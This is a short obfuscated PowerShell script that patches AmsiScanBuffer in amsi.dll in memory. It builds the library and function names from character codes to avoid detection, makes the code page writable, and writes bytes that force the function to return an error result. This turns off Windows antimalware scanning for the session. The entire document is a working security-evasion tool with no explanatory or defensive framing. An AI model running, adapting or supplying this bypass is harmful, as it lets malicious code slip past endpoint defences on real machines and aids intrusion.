$CFYCfQ = @"
using System;
using System.Runtime.InteropServices;
public class CFYCfQ {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr BFLrtiYDj, string i34JMAGt54HM3Bx);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr pKZ, UIntPtr yrym, uint L68uLVF2XBLi1lE, out uint OjVCCzxbLTV);
}
"@

Add-Type $CFYCfQ

$OMN3LggVxn = [CFYCfQ]::LoadLibrary("$([cHAr](97+46-46)+[cHAr]([bytE]0x6d)+[chAr](115+97-97)+[CHAR]([BYtE]0x69)+[chAr]([byTe]0x2e)+[cHAr](100*24/24)+[cHAR](108)+[cHaR](102+6))")
$H9D6KosdfD = [CFYCfQ]::GetProcAddress($OMN3LggVxn, "$([chAr]([bYte]0x41)+[CHAr](103+6)+[ChaR](115*27/27)+[cHaR]([bYtE]0x69)+[chAR](83*1/1)+[CHAr](99*29/29)+[ChaR](97)+[CHar](110+102-102)+[cHar]([BYtE]0x42)+[CHAr]([ByTe]0x75)+[chAr]([BytE]0x66)+[cHar]([bYte]0x66)+[cHar](101*85/85)+[chaR]([bYtE]0x72))")
$p = 0
[CFYCfQ]::VirtualProtect($H9D6KosdfD, [uint32]5, 0x40, [ref]$p)
$sfmhI = "0xB8"
$_6WfVRpAu6Bt = "0x57"
$qauZAvRFBaU9e9A = "0x00"
$EM7f4Rc = "0x07"
$kyNF6nfPWzcuPm = "0x80"
$rNZ10aiYBxpBsd7 = "0xC3"
$ui4qYA2TP = [Byte[]] ($sfmhI,$_6WfVRpAu6Bt,$qauZAvRFBaU9e9A,$EM7f4Rc,+$kyNF6nfPWzcuPm,+$rNZ10aiYBxpBsd7)
[System.Runtime.InteropServices.Marshal]::Copy($ui4qYA2TP, 0, $H9D6KosdfD, 6)